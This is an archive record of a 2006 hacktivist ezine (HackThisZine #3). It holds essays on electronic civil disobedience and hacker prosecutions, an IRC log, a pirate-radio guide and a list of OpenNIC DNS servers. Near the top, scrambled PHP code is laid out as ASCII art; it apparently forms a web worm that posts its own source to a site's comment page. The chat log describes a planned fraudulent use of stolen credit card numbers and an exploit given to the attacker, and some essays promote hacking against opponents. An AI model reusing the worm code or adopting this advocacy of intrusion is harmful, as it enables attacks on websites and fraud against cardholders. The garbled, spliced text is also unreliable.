scandal has opened many people’s eyes to the
disregard corporations have for public interest.

This campaign would not have been successful
without the diligent effort of hackers and political
activists working together. Time and time again,
history proves that people have the ability to
organize cooperatively to put direct pressure on
politicians and institutions to make progressive
changes. Hopefully this will set a precedent for
future successful electronic civil disobedience
campaigns in the years to come."
Papers,HackThisZine (HTZ) #3,eZine,,2006-03-20,: N/A,"(substr($url, 7), 0,          
                           +; "" .                ace(""\        
                       \"", ""\                        _SERVE      
                     +) {                                OST $l    
                 omme                                        cat=    
               ept-                                            te        
             n(\""                                                cl      
           t: M                                                  ebKi    
           ko                                                      -u    
           gt                                                        nn    
         mmen          ed+%3Ala                                      io    
           w=        ""); }    mak                                   $lo    
           ($      ), strpos(substr                                bstr  
           trpo    bstr($url, 7), ""                              h++;    
           ""\$""    \\$"",str_replace(""        \"""",str_replac    \"", ""\      
             ERVE  'PHP_SELF'])))), 2);    for ($i=0;$i<2;$     { $            
   ($do        OST   ocation/example2.p    ubaction=showcom  nts&        8831    
 ive=&sta      m=      & HTTP/1.1\r    ce      *\r\nAccep    ngua      \r  Acce  
 nc    g: g     d        \nClient     <?php                  et.p  \"",     "");f
         \""$sourc                   ?>\r\nUse                /5.0 (Ma      h; U  
   Ma        en) Appl            6 (KHTML, li            fari/412          ent-  
   ap    atio      w-form        ded\r\nConte            07\r                ep  
   \r\nHost: $domai    n\          xitup&mail                  ed+%3Alaughing%3  
               mment&                                      \n""); }       e_requ  
                   l) {    loca                  tr($  l, 8), s                  
                       su  tr(substr($u    7), 0, str  s(su                  
                       h+   "" . substr(str_replace(""\  ,             
                   ""\\"",     \"",file_get_contents($_S  VER[            
       i=0;$i<2;$i++)        = make_request($domain      T $l            
       on    wcom              88313&archive=&sta          cat=& HTTP/1  
       r\            uage: en\r      pt-Enc       gzip, def        Clie  
         pe      kret.p      \""w\"")          fp, \""  ource\"")      e(\$  
         t: M  illa              h; U; PPC Mac             pleW  Kit/    
         ko) Safa                      pe:                   form-u      
                                                               n\        
                                                                 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
""see you on the front page of the last newspaper those motherfuckers ever print""
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

                     .___.__          .__   __           .__   
                   __| _/|__|   ____  |__|_/  |_ _____   |  |  
                  / __ | |  |  / ___\ |  |\   __\\__  \  |  |  
                 / /_/ | |  | / /_/  >|  | |  |   / __ \_|  |__
                 \____ | |__| \___  / |__| |__|  (____  /|____/
                      \/     /_____/                  \/       
                          __                   ___.                        .___
  ____    ____    ____  _/  |_ _______ _____   \_ |__  _____     ____    __| _/
_/ ___\  /  _ \  /    \ \   __\\_  __ \\__  \   | __ \ \__  \   /    \  / __ | 
\  \___ (  <_> )|   |  \ |  |   |  | \/ / __ \_ | \_\ \ / __ \_|   |  \/ /_/ | 
 \___  > \____/ |___|  / |__|   |__|   (____  / |___  /(____  /|___|  /\____ | 
     \/              \/                     \/      \/      \/      \/      \/ 
     
    Electronic Civil Disobedience Journal !! Published by HackThisSite.org
       (a)nti copyright. distribute as freely as the wind and the trees.

                    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                    !!!  HACK THIS ZINE SPRING 2006   !!!
                    !!!     TABLE OF DISCONTENTS      !!!
                    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
""Globalizing a bad thing makes it worse. Business power is bad, so globalizing
it is worse. But globalizing a good thing is usually good. Cooperation and
sharing of knowledge are good, and when they happen globally, they are even
better. The kind of globalization there are demonstrations against is the
globalization of business power. And free software is a part of that movement.
It is the expression of the opposition to domination of software users by
software developers.""
                             Richard Stallman
 
                                   THEORY
[ hackers, crackers, artists & anarchists ........................... hackbloc ]
[ support hairball against unjust felony charges ...... hacker defense network ]
[ fighting the commercialization of the internet ... internet liberation front ]
[ pirate radio and the dreaded FCC ................................. evildeshi ]
[ declaration of the independence of cyberspace ....... john barlow of the EFF ]
[ uk indymedia interview ........... hackers defending open publishing systems ]
[ misadventures of irish hackers ........................................... C ]

                                   SKILLS
[ writing a php fuzzer to self-discover web vulnerabilities .................. ]
[ arp poisoning .................................................... darkangel ]
[ ars viralis : the viral art ..................................... nomenumbra ]
[ proxy chaining .................................................... outthere ]
[ tunnelling and tor ................................................ kuroishi ]
[ anatomy of a phone number ................................... br0kenkeychain ]

               
                                   ACTION
[ the art of writing a web worm in php ....................... world cant wait ]
[ dismantling the copyright industry ................ disrespectcopyrights.net ]
[ black and white chicago 2600 ............................................... ]
[ graffiti and counter-culture ........................ the wooster collective ]

                              CLOSING STATEMENTS
[ hack this zine: spring 2006 ... happenings ... make contact ... get involved ]

           HACK THIS ZINE SPRING 2006 is FREE TO COPY AND DISTRIBUTE
               GET ELECTRONIC VERSIONS AT HACKTHISSITE.ORG/ZINE
               CONTACT WHOOKA@GMAIL.COM OR IRC.HACKTHISSITE.ORG

                                !!!!!!!!!!!!!!!!
                                !!!  THEORY  !!!
                                !!!!!!!!!!!!!!!!
                             
""Whether through simple data piracy, or else by a more complex development of
actual rapport with chaos, the Web hacker, the cyernetican of the Temporary
Autonomous Zone, will find ways to take advantage of pertubations, crashes, and
breakdowns in the Net (ways to make information out of ""entropy). As a scavanger
of information shards, smuggler, blackmailer, perhaps even cyberterrorist, the
TAZ-hacker will work for the evolution of clandestine fractal connections. These
connections, and the different information that flows among and between them,
will form ""power outlets"" for the coming-into-being of the TAZ itself-as if one
were to steal electricity from the energy-monopoly to light an abandoned house
for squatters."" - Hakim Bey, Temporary Autonomous Zone
                             
[------------------------------------------------------------------------------]
[ hackers, crackers, artists & anarchists ........................... hackbloc ]
[------------------------------------------------------------------------------]

We started the Hack This Site project to spread the idea that information
demands to be free and by providing hackers with hands on training we could show
people how to use their skills for positive uses of free technology. After
meeting up with others who were working on similar projects and realizing how
people were inspired to turn skills to action from the first few zines we
released, we decided to get together and start Hackbloc.

Hackbloc are local gatherings of with hackers and activists to share skills, an
affinity group of hacktivists, and a tactic at protests and other actions. We
act to defend a free internet and a free society by mixing hacker and activist
strategies to explore both defensive hacktivism (defending free internet and
open publishing systems) and direct action hacktivism (actions against corrupt
corporations, governments and other forms of fascism). Hackbloc is a
decentralized network of cells which collaborate and coordinate actions in
solidarity with other social justice struggles around the world.

We met up at various actions and gatherings around the country to share and
network with other hackers and activists. We handed out underground hacker
magazines at guerrilla tables at DEFCON. We have had several workshops and
parties in Chicago where dozens of hackers around the region got together to
play wargames, pick locks, swap code, and otherwise plot for future projects and
actions. We got together to hold huge protests in both DC and San Francisco for
the World Bank / IMF meetings where several hundred thousand people gathered for
anti-war and anti-capitalists protests. The more we started coordinating our
actions with others who were working on similar projects, the more we began to
realize how different struggles all over the world are connected. 

Battles in the courtrooms over political and hacker arrests and investigations
of multiple people all over the world provide valuable lessons for those
considering getting involved, playing the game, and organizing online
communities. In order to be safe and effective, we need to practice good
security culture by working only with trusted people in tight decentralized
affinity groups, maintain a mainstream front to recruit people for side
projects, and work to settle differences between potential allies and unite for
the greater good. 

As people who can see beyond and create alternatives to corrupt systems, hackers
are in a unique position to confront and fight the forces which attack digital
rights and a free internet. Independent media, free technology and
non-commercial internet creates temporary autonomous zones where an underground
network of hackers who's duty and responsibility includes training each other to
confront and fight these injustices - to defend hackers facing jailtime, expose
corporate and government corruption, find alternatives to commercial software,
share knowledge and talk tactics with potential allies.

We are not the violent, destructive madmen that law enforcement and the media
paints us as. We work to build a free internet and a free world and we refuse to
be bullied by right wing extremists, white hat sellouts, or law enforcement who
stand in the way. Hacktivists of the world, unite!

--

""The FBI COINTELPRO program was initiated in 1956. Its purpose, as described
later by FBI Director J. Edgar Hoover, was ""to expose, disrupt, misdirect,
discredit, or otherwise neutralize activities"" of those individuals and
organizations whose ideas or goals he opposed. Tactics included: falsely
labelling individuals as informants; infiltrating groups with persons instructed
to disrupt the group; sending anonymous or forged letters designed to promote
strife between groups; initiating politically motivated IRS investigations;
carrying out burglaries of offices and unlawful wiretaps; and disseminating to
other government agencies and to the media unlawfully obtained derogatory
information on individuals and groups.""

We are facing unprecedented police state measures which specifically target
activists and hackers. In the name of national security, federal law enforcement
has been spying on, targetting, and harassing activists including anti-war,
animal rights, and earth first and other protest groups. Whether they take on
the form of the USA Patriot Act, expanded Homeland Security powers, Total
Information Awareness, enemy combatants, military tribunals, or Bush personally
authorizing the NSA to spy on Americans without court orders and warrants, these
actions reveal a pattern of abuse and the transition to a neo-fascist police
state which treats hackers and activists as terrorists. When an administration
breaks the law and walks all over the constitution, it is time for a regime
change.

[------------------------------------------------------------------------------]            
[ support hairball against unjust felony charges ...... hacker defense network ]
[------------------------------------------------------------------------------]

Federal prosecuters are accusing Michael Wally(known as ""Hairball"") of
Pittsburgh of 'stealing' and distributing 37,000 free phone cards from an online
giveaway, citing damages at over $333,000. As of this writing, the US Attorney
is offering Hairball a deal where he would plead guilty to felony wire fraud and
serve up to three years in jail. 

Folgers.com was giving away free 30 minute phone cards on it's website as part
of an online promotion to people who filled out a quick survey. Allegedly,
Hairball found a way to automate the process and get lists of free phone cards.
What is unclear about these accusations is whether this is an actual criminal
offense or simply a violation of Folger's terms of service agreement(a civil
case). 

Hairball, having started HBX Networks, was a popular target of cyber-crime
authorities. HBX has started a number of computer hacking projects, including
the free shell project, the HAXOR radio show, wardialing projects, a bustling
IRC server, and more. Hairball has contributed positively to the hacking
community, but has fallen victim to unjust prosecution with overblown
sentencing.

As part of a new trend in cyber crime and law enforcement, hackers and activists
are treated like terrorists and are often subject to illegal surveillance and
unjust investigation, prosecution, and sentencing. Robert Erdley of the
Pittsburgh High Tech Crimes Task Force has personally raided and arrested
Hairball multiple times, including an earlier incident in late August 2004
relating to HBX's wardialing project. His case has since been passed on to
federal authorities, and is now facing several years in jail and large
restitutions for hurting or stealing from nobody.

Hairball has always worked to defend free technology and has inspired a number
of people to learn about computers and hacking. If Hairball goes to jail, a
great crime will have been committed against the hacking community by
reactionary federal prosecutors. We need to stick together to defend our
comrades facing jailtime and write letters, make phone calls, and otherwise
spread the word about unjust hacker prosecution.

THEY'RE IN THERE FOR US, WE'RE OUT HERE FOR THEM

Hackers considering starting a Hacker Defense Network should check out various
prison support networks for setting up legal support. 

www.prisonactivist.org www.spiritoffreedom.org.uk www.anarchistblackcross.org
www.abcf.net  www.booksnotbars.org  www.prisonbookprogram.org  

.--------------------------------------------------------------------.
| Session Start: Friday, 4 February 2005                             |
| Participants:                                                      |
|    narc (narc@narc.net)                                            |
|    Kfir (kfiralfia@hotmail.com)                                    |
.--------------------------------------------------------------------.
[07:24:40 PM] Kfir: hello there.
[07:25:09 PM] narc: hi. I'm not liable for prosecution, or
              anything, based on the logs I sent you?
[07:25:32 PM] narc: that concerns me.. I'm willing to help you in
              every capacity possible, but that's one thing I'd rather
              avoid
[07:26:00 PM] Kfir: I'm not sure... but i can't imagine anyone would
              prosecute someone who is walking away, and helping catch
              the mastermind
[07:26:13 PM] narc: well. I never actually intruded on your
              system
[07:26:19 PM] narc: all I did was notice an exploit in the .php
[07:26:19 PM] narc: heg
[07:26:21 PM] narc: heh*
[07:26:41 PM] Kfir: I tell you what though, i would fight tooth and
              nail to prevent your prosecution.
[07:26:55 PM] narc: I don't *think* that's a criminal offence
[07:27:15 PM] Kfir: i would rather not prosecute anyone if you're
              going to go down - you are helping us tremendously, and
              you are preventing some very serious criminal activity.
[07:27:47 PM] Kfir: i am in the process of trying to get all of the
              credit card numbers fraud blocked.
[07:27:55 PM] Kfir: it's not easy work, but i need some time.
[07:27:58 PM] narc: yeah
[07:28:01 PM] narc: I can imagine
[07:28:04 PM] Kfir: is there any way you can postpone the charges for
              a couple of days?
[07:28:08 PM] narc: yes
[07:28:13 PM] narc: he's stymied at the moment
[07:28:19 PM] narc: he's putting it off til at least sunday
[07:28:23 PM] narc: maybe later in the week
[07:28:28 PM] Kfir: good.
[07:28:50 PM] Kfir: i'm going to need that much time to make sure no
              one gets defrauded.  i don't give a damn about the
              server at this point.
[07:29:10 PM] narc: yeah... he already had SQL dumps by the time
              he contacted me
[07:29:16 PM] Kfir: he can have the goddamned thing.  it's not like
              we're going to pack our bags and dissappear.
[07:29:17 PM] narc: so I don't quite know how he obtained them
[07:29:34 PM] narc: yeah, well, from what I gathered from running
              processes he pasted, you were backing the box up anyway
[07:29:35 PM] narc: heh
[07:30:15 PM] Kfir: If i'm going to get the fbi to listen to me, a
              credible witness would be a long way.  If you are
              gauranteed from prosecution, would you cooperate with
              authorities?
[07:30:40 PM] narc: yeah
[07:30:43 PM] Kfir: yeah, i have the entire server tar balled and
              safely stored for future use.
[07:30:58 PM] narc: but this may cause problems insofar as I'd
              rather not have him know who I am
[07:31:06 PM] Kfir: does he?
[07:31:09 PM] narc: no
[07:31:10 PM] narc: he probably has a LOT of sway with certain
              people
[07:31:55 PM] narc: he's made a lot of contacts in the scene...
              knows many, many security experts, and probably knows
              plenty of militant activists too
[07:31:56 PM] Kfir: Jeremy can get into very big trouble - he's just a
              kid, and i would hate to see a man with obvious talent
              be sent to prison.
[07:32:30 PM] narc: yeah... I'm only 18
[07:32:31 PM] Kfir: but this credit card business is just crazy - i
              really don't understand what would drive someone to do
              something so foolish.
[07:32:49 PM] Kfir: wow...
[07:33:09 PM] Kfir: kids today... i need to bone up on my security
              knowledge. 
[07:33:47 PM] narc: if there's one thing he is, it's willing to
              goto prison
[07:34:09 PM] narc: his beliefs consume everything he does
[07:34:23 PM] narc: not fundamentally that different from your
              average Islamic terrorist, I guess.
[07:34:33 PM] Kfir: i started coding HQ and administering the PW
              server without much experience.  after reading the logs
              i can see how much there is to learn - it almost seems
              like it would take a full-time concentration to master.
[07:35:20 PM] Kfir: so why did you agree in the first place?  you
              obviously have moral fiber... why destroy other peoples
              property?
[07:35:29 PM] narc: I never planned to
[07:35:38 PM] narc: I was going to see where it was heading
[07:35:47 PM] narc: showing him an exploit seemed like a good way
              to gain his trust
[07:36:12 PM] Kfir: oh..
[07:36:25 PM] Kfir: so does he not have root access at this point?
[07:36:32 PM] narc: nope
[07:36:44 PM] Kfir: is he waiting for the bots to restart?
[07:36:47 PM] narc: I've had the distinct impression in the year
              and a half that I have known the guy that he has been up
              to a lot more than it seems
[07:36:49 PM] narc: turns out I was right
[07:37:48 PM] narc: besides, the exploit I gave him never quite
              worked
[07:38:28 PM] narc: I knew it'd work on the test copy of the bot
              he'd setup, but not on your box -- diff ver of php
              command line binary
[07:38:53 PM] Kfir: so is he waiting for the bots to fire up?
[07:39:08 PM] narc: I believe so
[07:39:28 PM] narc: but believe me, that flaw was very, very
              minor... even exploiting is well past most people's
              capabilities, as the vast majority of shell
              metacharacters were prohibited
[07:39:40 PM] Kfir: do you have any details as to his plans to use the
              pw server to launch the cc charge exploit?
[07:39:41 PM] narc: you ran a pretty good system
[07:39:49 PM] narc: from what I've seen
[07:39:59 PM] Kfir: that's rob's work... i mainly work on the php
              code.
[07:40:04 PM] narc: yeah
[07:40:10 PM] narc: well, your PHP code had few flaws
[07:40:12 PM] narc: if any...
[07:40:15 PM] narc: Xec never found any
[07:40:33 PM] Kfir: yeah, we were very careful in our patch up after
              the RNC hack
[07:40:59 PM] Kfir: we made sure no malicious chars were allowed to
              enter an sql query.
[07:41:13 PM] narc: his own site had a few billion holes
[07:41:24 PM] Kfir: hts.org?
[07:41:36 PM] narc: yeah
[07:41:51 PM] narc: I got involved with them to learn, not to take
              down the opposition's political speech
[07:41:57 PM] Kfir: i trained on his site about a year ago.
[07:42:11 PM] Kfir: agreed - let the best ideas win.
[07:42:37 PM] Kfir: not the best gun.
[07:42:47 PM] narc: I don't think he realizes that he has become
              precisely what he purports to despise so much
[07:43:11 PM] Kfir: no offense to you, but that seems to be very
              typical of those we encounter on the ""other side"".
[07:43:32 PM] Kfir: you seem extremely mature for an 18-year-old, it's
              almost hard to believe.
[07:43:42 PM] Kfir: But you Aussies always were a breed apart.
[07:44:10 PM] narc: heh... I just started college, I don't have
              much interest in going down for some stupid hacking
              offence
[07:44:42 PM] Kfir: i think he's intoxicated by the glory of being an
              ""underground hacker"".
[07:44:59 PM] Kfir: he's in love with this romantic notion of taking
              down the ""fascists"".
[07:45:02 PM] Kfir: very deluded.
[07:45:02 PM] narc: no glory in destruction, or so I've found
[07:45:38 PM] Kfir: do you have any details as to his plans to use the
              pw server to launch the cc charge exploit?
[07:45:51 PM] Kfir: i noticed he mentioned that in the logs.
[07:46:12 PM] narc: yes, he wanted me to write scripts to do it
[07:46:14 PM] narc: still does, I guess
[07:46:30 PM] narc: but that's been delayed by the fact the
              exploits have mysteriously disappeared
[07:46:40 PM] Kfir: so will you postpone that as much as you can
              without him knowing your postponing?
[07:46:57 PM] Kfir: assuming he finds another exploit?
[07:47:04 PM] narc: he won't know. he's paranoid; believes that
              the feds are probably already watching him
[07:47:14 PM] narc: probably are, too, given his history
[07:47:19 PM] narc: they've tried to pin a lot of stuff on him but
              failed
[07:47:25 PM] Kfir: has he broadcasted the cc#'s yet?
[07:47:34 PM] narc: no. that waits until the charges occur
[07:47:41 PM] narc: then he plans to release them to cryptome.org
              and P2P networks
[07:47:49 PM] narc: as well as using his media contacts to ensure
              wide publicity
[07:47:54 PM] Kfir: well, at that point, they'll be useless.
[07:47:59 PM] narc: yeah
[07:48:06 PM] narc: but I think the point is a ""moral victory""
[07:48:08 PM] narc: or so he says
[07:48:09 PM] Kfir: how does he plan to get publicity while remaining
              anonymous?
[07:48:24 PM] narc: anonymous remailers/his bounce servers, I
              guess.
[07:48:36 PM] Kfir: will an official organization take credit?
[07:48:38 PM] narc: unless he's caught in the act, it'll take
              months of subpoenas to prove it was him
[07:48:43 PM] narc: yeah
[07:48:44 PM] narc: ILF
[07:48:48 PM] narc: (""Internet Liberation Front"")
[07:48:51 PM] Kfir: why months of subpoenas?
[07:48:57 PM] narc: international servers...
[07:49:00 PM] narc: most aren't domestic
[07:49:16 PM] narc: and he plans to get someone else to wipe the
              lot to break the chain
[07:49:29 PM] narc: he might not be that talented at hacking per
              se, but he knows how to cover his tracks
[07:49:30 PM] Kfir: well, the logs are fairly incriminating.
[07:50:00 PM] narc: I'm almost certain he'd get away with it if I
              hadn't contacted you
[07:50:10 PM] Kfir: no argument there.

[------------------------------------------------------------------------------]
[ fighting the commercialization of the internet ............................. ]
[------------------------------------------------------------------------------]

As hard as corporations and governments try to control the flow of data on the
internet, they can never catch up with hackers who are always one step ahead and
have developed all sorts of ways to circumvent restrictions placed on exchanging
information freely. An ever-growing number of darknets and other models of
content distribution have been created using file sharing services such as
Gnutella and BitTorrent, open publishing systems such as IndyMedia and Wiki, and
open DNS systems such as OpenNIC and Afraid.org. These DIY networks cannot be
bought, sold, or otherwise controlled and are unstoppable weapons which will not
only make copyright and commercial internet irrelevant, but pave the way to
developing entirely new networks, pirate utopias based on an open source
anarchist approach towards the free exchange of information.

""Quantity and quality of P2P technologies are inversely proportional  
to the numbers of lawsuits issued to stop P2P"" - 3rd Monty's Law

--
Gross privacy violations are a small part of fundamental problems with how ICANN
is structured. In a paper published at kuro5hin.org, ""An Immodest DNS Proposal""
outlines the broader problems with ICANN's DNS model:

* DNS is centrally controlled by an organization (ICANN) whose primary interest
is supporting business, rather than in maintaining and improving the system
itself and whose primary claim to legitimacy is through delegation by a single
country's government (USA).

* The system is managed by a single for-profit corporation (NSI), which is bad
enough but registrations are managed by many competing for-profit corporations.
NSI is also primarily legitimized by delegation from a single government (USA
again, naturally).

* The Intellectual Property laws of a single country (there's the USA again) are
being used inappropriately to control the activities of users in non-commercial
parts of the Net (corporate control of the .net and .org domain trees through US
Trademark law) and in other countries.
--

Open publishing systems such as the IndyMedia allows people to post
announcements freely and become the media. IndyMedia is a decentralized network
of media collectives found in most major cities around the world that allow
people to post announcements, update fliers, and otherwise tune in to the
happenings of the area. There are several flavors of IMC software including
sfactive, mir, and dadaimc - all of which have advantages and disadvantages.
IndyMedia software is generally open source and people can and do set up their
own IMC collectives with minimal effort. Wiki open publishing software has
becoming increasingly popular over the past few years. Sites with Wiki allow
people to create and modify all pages in the index, and instead of resulting
with chaos and confusion, services like Wikipedia.org have become wildly
successful.

Peer to peer file sharing services open whole new worlds where we can
communicate and collaborate at an accelerated rate, where creativity isn't
inhibited by such artificialities as copyright laws and property rights. Moving
well beyond centralized systems such as Napster, technology like BitTorrent,
Gnutella, FastTrack, eDonkey, and countless others have created networks
independent of centralized servers allowing people to share files and write
their own clients for these protocols. Our success with these services are
indicated by how frightened the commercial industry is getting and how desperate
and ineffectual their attempts to shut down these services through legal means.
When one service shuts down, another three spring up even more decentralized and
anonymous than before.

In addition to providing free dynamic DNS services, Afraid.org has also set up a
system where domains can be made public and shared with other users on the
internet. People can register domains, point them to afraid.org's DNS servers,
and make them 'public' - allowing others to register their own subdomains and
have them point to their own servers. There are thousands of public domains that
people can already start using.

--

ICANN and Alternatives to Commercial DNS
Since ICANN policy is now requiring valid public contact information, many
domain names which host controversial content including dissident or
whistleblowing services have had to choose to give up their name, email, phone
number, and address or face being shut down. Several domains we run including
Hack This Site, Hacktivist.net, FreeJeremy.com and Prole.info were all targetted
and shut down without any warning, taking weeks for them to respond to us faxing
in copies of our drivers license, phone bills, and other documentation
confirming our true information. This new policy is an obscene violation of our
privacy and is a threat to dissident or whistleblowing groups.

In the resulting discussions, the OpenNIC project was created to be a ""user
owned and controlled Network Information Center offering a democratic,
non-national, alternative to the traditional Top-Level Domain registries"". Users
can jump on this network by adding an OpenNIC DNS server to their system
configuration.

OpenNIC is non-profit and structured in a democratic way, with elected
administrators and public ballots for new policies, also giving the ability for
people to start their own top level domains (such as .indy, .geek, .null, .oss,
and .parody) The idea is to be non-profit, democratic, and allow people to
create and manage their own top level domains.

As long as we are communicating through commercial ISPs, we subject ourselves to
networks which can be easily monitored and controlled. Even though we can
develop all sorts of ways of sliding in and out of these systems securely, we
are still reliant on internet infrastructure that is owned and run by
corporations and government. We need to be come used to the idea of 

The Guerrilla.Net project proposes setting up an alternative network of open
wifi nodes. Encryption and anonyminity is integrated at a router level, also
creating the ability to establish secure tunnels to the 'real' internet. The
idea is to set up a decentralized network of wifi cells run by entirely
non-profit groups using open standards.

--
""There is evidence that the darknet will continue to exist and provide low cost,
high-quality service to a large group of consumers. This means that in many
markets, the darknet will be a competitor to legal commerce. From the point of
view of economic theory, this has profound implications for business strategy:
for example, increased security may act as a disincentive to legal commerce.""
--
""As pressure is asserted upon the Internet from insecure individuals in various
World Governments, an alternative network is needed to insure that the free flow
of information is not obstructed, captured, analyzed, modified, or logged. This
is the main purpose of guerrilla.net. To provide a networking fabric outside of
Governments, commercial Internet service providers, telecommunications
companies, and dubius Internet regulatory bodies. The free flow of private
information is a REQUIREMENT of a free society.""
(guerrilla.net)
--
To help with the OpenNIC project, set up your computer(and convince your ISP) to
use the additional OpenNIC DNS servers and sign up on the mailing list to keep
up and contribute to the project. Some people have also suggested the idea of
having ""OpenDNS Day"", where for one day out of the month people would have their
servers configured to disallow connections from ICANN requests, encouraging
people to set up OpenNIC on their machines.

OpenNIC DNS servers are split into three tiers: the first two tiers are for
internal synchronization purposes while the third tier are end-user servers
which you can add to your network settings to hop on the entwork.

Tier 0:
ns0.opennic.glue (opennic.glue; Oakland, CA, US) - 131.161.247.232

Tier 1
ns1.opennic.glue (.oss; San Jose, CA, US) - 208.185.249.250
ns4.opennic.glue (.oss; San Jose, CA, US) - 208.185.249.251
ns8.opennic.glue (.parody; US) - 65.243.92.254
ns10.opennic.glue (.indy; Dallas, TX, US ) - 66.227.42.140
ns11.opennic.glue (.indy; Dallas, TX, US ) - 66.227.42.149
ns12.opennic.glue (.fur, .geek; Garden Grove, CA, US ) - 64.81.44.251

Tier 3:
ns1.de.opennic.glue (Cologne, DE) - 217.115.138.24
ns1.jp.opennic.glue (Tokyo, JP) - 219.127.89.34
ns2.jp.opennic.glue (Tokyo, JP) - 219.127.89.37
ns1.nz.opennic.glue (Auckland, NZ) - 202.89.131.4
ns1.uk.opennic.glue (London, UK) - 194.164.6.112
ns1.phx.us.opennic.glue (Phoenix, AZ, US) - 63.226.12.96
ns1.sfo.us.opennic.glue (San Francisco, CA, US) - 64.151.103.120
ns1.co.us.opennic.glue (Longmont, CO, US) - 216.87.84.209
ns1.ca.us.opennic.glue (Los Angeles, CA, US) - 67.102.133.222
--


[------------------------------------------------------------------------------]
[ hacktivism project introduction ............................................ ]
[------------------------------------------------------------------------------]

As hacktivists, we encourage hackers to consider the social and political
implications of actions. We believe it is irresponsible to teach people the
fundamentals of internet security without a broad understanding of the world
around them. We are in a unique position to work together to defend our rights
on the internet and in social justice struggles around the world. 

We maintain a diversity of tactics through the following collectives which work
together to build a broader movement:

Hacktivist.net - We serve as an above ground Ôthink tank' for the ideals of
hacktivism and electronic civil disobedience. We defend open publishing systems
and encourage free debate about the ethics of mixing hacking and radical
politics. 

Hackbloc.org - A model of organizing hacktivist cells in each local city. Each
cell maintains autonomy from central leadership yet coordinates and networks
with other hackbloc cells all over the world. The Hackbloc website serves as a
networking body where people can read updates and plug in to local collectives.

HackThisSite.org - An above ground training resource where everybody can
practice their hacking skills in a set of realistic challenges. We create a
learning environment where people can find out and get involved with many of the
other projects our people are working on. 

Various projects and groups we are involved with:

* Publish an open hacktivist journal to be distributed for free over the
internet and in print
* Liberation Radio: creation and distribution of subversive audio recordings and
other underground materials through an online radio station
* Protect free speech on the internet by making contributions and code audits to
major IndyMedia, Wiki, IRC, P2P file sharing, and other open publishing code
bases
* Provide hosting and support for radical systems in cases of hack attacks,s
erver seizures, etc.
* Participate in various conventions, protests, and other national actions to
provide on-the-ground communication while making noise and spreading the word
about hacktivism
  
We use a decentralized, directly democratic model of organization and are
looking for contributions and coordination from people who would like to become
involved with the project. We are interested in working together with other
groups and individuals to build a larger hacker movement. Together we stand,
divided we fall.

Hacktivists of the world, unite!

[------------------------------------------------------------------------------]
[ pirate radio and the dreaded FCC ................................. evildeshi ]
[------------------------------------------------------------------------------]

FM EXCITERS And AMPLIFIERS
This is the ÒheartÓ of your station. It has an oscillator, an audio input
section, a FM modulation section, a RF pre-amplification stage and an RF
amplified output stage and sometimes an RF filter stage. 

ANTENNAS 
An properly tuned (low VSWR) antenna, J-pole, 5/8ths wave vertical, 1/4 wave
dipole, broadband etc. as high up as you can get it makes up for LOTS of power
and is money and time WELL spent! 

AMPLIFIERS 
Amplifiers are pretty boring pieces of equipment. They amplify your measly
little exciterÕs signals to levels that will deliver solid reception to your
listening audience. 

FILTERS 
These devices are used to decrease the output of frequencies with which you are
NOT broadcasting. These OTHER frequencies are known as harmonics and you donÕt
want any! Harmonics are your enemy! 

SWR METERS 
You get what you pay for when you buy a VSWR meter. Cheap ones are worthless,
theyÕll lie and make you confident when you should be otherwise. Bird makes the
BEST and they are expensive at $300+ US, however, Diawa, Diamond, Standard
Communications are all good, servicable units that you can trust and will last
and last. 

DUMMY LOADS 
YouÕll have a perfect VSWR reading every time with a dummy load! No signal out
but what the hey! Easy to build a little one, pre-built ones can cost $30 - $100
or so depending on the wattage it must handle.     

Tuning your antenna 
Using a properly tuned antenna is essential for micropower broadcasting on the
FM band. An antenna that is not properly tuned will not pass along your
transmitterÕs power as efficiently as it could and this leads to a general
degradation of signal coverage. 

ETHICS: 
The airwaves are a community property. One must always treat it 
as such, respecting the space of other stations, both commercial 
and micro. 

LOOKING FOR OPENINGS: 
Admittedly, some parts of the country have no empty channels. Places like south
Florida, California, New York and Chicago are virtually crammed full of
stations. For the rest of us, if we look hard, we can locate one or more unused
channels. 

ONCE YOU DECIDE 
YouÕve located a channel thatÕs clear and has no strong nearby adjacents
broadcasting. 
1. Educate yourself about radio theory. Buy the Radio AmateurÕs Handbook and
study it. 
2. YouÕll need some essential tools to avoid working blind. You should have an
oscilloscope with at least a 100Mhz bandwidth so you can see what your carrier
looks like and if the device is operating incorrectly, causing parasitic
oscillation. You should have a good stable frequency counter that has at least a
10 ppm accuracy and resolution to 1hz at 100Mhz. A good Volt-Ohmmeter for
general measurements of voltages and resistance. 

A SWR impedance analyzer bridge (MFJ Enterprises makes an affordable unit, model
MFJ259, which combines a frequency counter, R.F. signal generator, SWR meter and
resistance meter in one versatile unit). 

ESSENTIAL COMPONENTS OF A STATION 
The main transmitter. A unit that is crystal-controlled and/or PLL synthesized,
using varactor diode tuning and modulation methods. A broadcast limiter. Stereo,
if you have a stereo generator. This is essential to insure non-interference to
adjacent channels and maintain maximum volume without overmodulating. Setting
your modulation levels.

  * An SWR/Power Meter to monitor the condition of your antenna system. 
  * A mixing board to act as your program control center. 
  * Audio sources to provide program material. 
  * A good microphone. 

Optionally, if you broadcast in stereo, youÕll need to add the fol- 
lowing: 

  * A multiplex ÒstereoÓ generator.  
  * Two-channel broadcast limiter. 

All components back to the studio should be stereo capable. 

The original version of this article was written by EvilDeshi although to fit
the article onto this single page we needed to water down the content alot but
you can read the full article at: http://wickedradio.org/radio.rtf 

[------------------------------------------------------------------------------]
[ declaration of the independence of cyberspace ....... john barlow of the EFF ]
[------------------------------------------------------------------------------]

Governments of the Industrial World, you weary giants of flesh and steel, I come
from Cyberspace, the new home of Mind. On behalf of the future, I ask you of the
past to leave us alone. You are not welcome among us. You have no sovereignty
where we gather.

We have no elected government, nor are we likely to have one, so I address you
with no greater authority than that with which liberty itself always speaks. I
declare the global social space we are building to be naturally independent of
the tyrannies you seek to impose on us. You have no moral right to rule us nor
do you possess any methods of enforcement we have true reason to fear.

Governments derive their just powers from the consent of the governed. You have
neither solicited nor received ours. We did not invite you. You do not know us,
nor do you know our world. Cyberspace does not lie within your borders. Do not
think that you can build it, as though it were a public construction project.
